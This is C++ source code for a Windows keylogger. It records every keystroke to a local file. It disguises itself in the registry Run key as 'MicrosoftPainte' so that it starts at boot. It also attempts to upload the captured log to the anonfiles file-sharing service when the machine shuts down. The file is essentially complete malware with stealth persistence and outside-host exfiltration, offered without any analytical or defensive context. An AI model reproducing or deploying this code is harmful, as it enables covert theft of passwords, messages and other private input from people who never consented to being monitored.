#include "keyboard.h"
bool isCapsLock() {
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
		return true;
	else
		return false;
}

bool isShift() {
	if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return true;
	else
		return false;
}

static std::string post_request(const std::string url, const std::string body1, const std::string path2file)
{
	const std::string field_divider = "&";
	std::stringstream result;
	try
	{
		using namespace std;

		// This block responsible for reading in the fastest way media file
		//      and prepare it for sending on API server
		ifstream is(path2file);
		is.seekg(0, ios_base::end);
		size_t size = is.tellg();
		is.seekg(0, ios_base::beg);
		vector<char> v(size / sizeof(char));
		is.read((char*)&v[0], size);
		is.close();
		string body2(v.begin(), v.end());

		// Initialization
		curlpp::Cleanup cleaner;
		curlpp::Easy request;
		list< string > headers;
		headers.push_back("Content-Type: application/json");
		headers.push_back("User-Agent: curl/7.77.7");

		using namespace curlpp::Options;

		request.setOpt(new Verbose(true));
		request.setOpt(new HttpHeader(headers));
		request.setOpt(new Url(url));
		request.setOpt(new PostFields(body1 + field_divider + body2));
		request.setOpt(new PostFieldSize(body1.length() + field_divider.length() + body2.length()));
		request.setOpt(new curlpp::options::SslEngineDefault());
		request.setOpt(WriteStream(&result));
		request.perform();
	}
	catch (curlpp::LogicError& e)
	{
		std::cout << e.what() << std::endl;
	}
	catch (curlpp::RuntimeError& e)
	{
		std::cout << e.what() << std::endl;
	}

	return (result.str());

}


auto detectKey() {
	while (1)
	{
		for (DWORD press = 0x08; press <= 0xFE; press=press+0x1) {
			if (GetAsyncKeyState(press) & 0x8000) {
				std::this_thread::sleep_for(std::chrono::milliseconds(99));
				std::string aya(1, press);
				if (!(isShift() ^ isCapsLock())) {
				boost::algorithm::to_lower(aya);
				}
				switch (press) {
				case VK_SPACE:
					aya = "[Space]";
					break;
				case VK_SHIFT:
					aya = "[Shift]";
					break;
				case VK_RSHIFT:
					aya = "[RSHIFT]";
					break;
				case VK_RETURN:
					aya = "[Enter]";
					break;
				case VK_TAB:
					aya = "[TAB]";
					break;
				case VK_CONTROL:
					aya = "[CTRL]";
					break;
				case VK_DELETE:
					aya = "[DEL]";
					break;
				case VK_CAPITAL:
					aya = "[Caps Lock]";
					break;
				case VK_BACK:
					aya = "[Backspace]";
					break;
				}

				return aya;
			}
		}

	}
}

void WritefileAya()
{
	std::ofstream myfile;
	while (true) {
		std::string key = detectKey();
		auto file = std::filesystem::path("output.txt").filename().string();
		myfile.open("output.txt",std::ofstream::app);
		myfile << key;
		myfile.close();
		if (GetSystemMetrics(SM_SHUTTINGDOWN)) {
			post_request("https://api.anonfiles.com/upload", "@file=", file);
		}
	}
}

auto migrant()
{
	while (true)
	{
		std::string key = detectKey();
		std::cout << key;
	}
}

bool PersistantApplication() {
	HMODULE hModule = NULL;
	std::string reg;
	char Path[MAX_PATH];
	GetModuleFileNameA(hModule, Path, sizeof(Path));
	reg = Path;
	HKEY key;
	LONG regeditOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
	if (regeditOpen == ERROR_SUCCESS) {
		regeditOpen = RegSetValueEx(key, "MicrosoftPainte", 0, REG_SZ, (BYTE*)reg.c_str(), (reg.size() + 1) * sizeof(wchar_t));
		if (regeditOpen == ERROR_SUCCESS) {
			return true;
		}
		else {
			return false;
		}
	}
	else {
		return false;
	}
}
int main()
{

	std::thread t1;
	std::thread t2;
	std::thread t3;
	t1 = std::thread(PersistantApplication);
	t2 = std::thread(migrant);
	t3 = std::thread(WritefileAya);
	t1.join();
	t2.join();
	t3.join();
}
